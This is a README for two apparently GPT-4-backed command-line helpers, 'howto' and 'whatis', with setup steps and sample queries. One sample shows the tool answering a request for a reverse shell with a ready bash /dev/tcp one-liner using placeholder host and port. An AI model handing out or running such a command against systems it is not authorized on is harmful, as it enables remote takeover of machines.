# howto & whatis

Simple, GPT-4 powered, command-line tools designed to assist IT professionals with their daily tasks.

## Setup

1. Set `OPENAI_API_KEY` environment variable containing OpenAI API key.
2. Download the release binaries or (modify the code and) build them by yourself using `cargo build -r`.
3. Place the binary in your `PATH`.

## Usage examples

```shell
$ howto format string in Rust

Use the `format!` macro. For example: `let s = format!("{} {}", "Hello", "World");`

```

~~~shell
$ howto get reverse shell using bash

```bash
bash -i >& /dev/tcp/HOST/PORT 0>&1
```
~~~

```shell
$ whatis Log4Shell

Log4Shell is a vulnerability in Apache Log4j.
```

```shell
$ whatis decoded string: aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj1kUXc0dzlXZ1hjUQ==

The decoded string is: https://www.youtube.com/watch?v=dQw4w9WgXcQ

```
